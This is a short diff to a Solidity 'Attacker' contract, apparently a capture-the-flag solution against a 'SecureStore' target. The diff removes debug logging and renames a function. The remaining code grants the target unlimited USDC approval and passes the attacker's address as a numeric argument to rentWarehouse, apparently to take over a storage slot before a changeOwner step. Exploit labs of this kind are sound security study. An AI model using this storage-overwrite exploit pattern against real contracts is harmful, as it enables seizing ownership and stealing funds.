@@ -1,6 +1,5 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.13;
-import "hardhat/console.sol";
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 interface ISecureStore {
@@ -19,11 +18,9 @@ contract Attacker {
         USDC = _USDC;
     }
 
-    function changeWHAddress(ISecureStore target) external {
-        console.log("Balalnceo f this contract", IERC20(USDC).balanceOf(address(this)));
+    function changeRegistryAddress(ISecureStore target) external {
         IERC20(USDC).approve(address(target), type(uint256).max);
         target.rentWarehouse(1, uint256(uint160(address(this))));
-
     }
 
     function changeOwner(ISecureStore target) external {
